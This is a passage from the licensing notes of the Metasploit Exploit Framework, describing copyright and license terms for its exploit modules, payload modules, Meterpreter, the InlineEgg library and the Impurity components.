individual copyrights are marked at the top of each file. Copies of the GPL and
Artistic licenses can be found in the "docs" subdirectory, named "COPYING.GNU"
and "COPYING.Artistic" respectively.

\par
The exploit modules included in this package are individually licensed and
Copyright (c) by their respective authors. Please see the Author field of each
module to determine what license is specified. If you need a module under a
different license (GPL module and you want to include it in non-GPL code),
please contact the author directly.

\par
The payload modules included in this package are individually licensed and
Copyright (c) by their respective authors. Please see the Author field of each
module to determine what license is specified. Some of the assembly payloads
were obtained from public resources that did not specify the terms of license.
These payloads are being treated as public domain and will be removed or
rewritten if a dispute arises.

\par
The Meterpreter is dual-licensed under the GNU General Public License v2.0 and
the Artistic License. The Meterpreter component is Copyright (c) 2004-2005 Matt
Miller. Please contact Matt Miller directly for questions regarding the license
and licensing of the Meterpreter. 

\par
The InlineEgg library and some of the examples are Copyright (c) 2002, 2003 Core
Security Technologies, Core SDI Inc and under a non-commercial license. Please
see the COPYING.InlineEgg file in the "docs" subdirectory for more information.
This code may not be included or referenced in any form by a commercial
derivative of the Metasploit Exploit Framework.

\par
The Impurity components are licensed under the GNU General Public License v2.0
and Copyright (c) 2003 Alexander E. Cuttergo. Modifications have been made from
the original version and the additional components are Copyright (c) 2003 H D
Moore / METASPLOIT.COM. The assembly payloads and handler routines that are
incorporated into the Metasploit Exploit Framework are compatible with, but not
derivative works of, the original Impurity release.


\end{document}
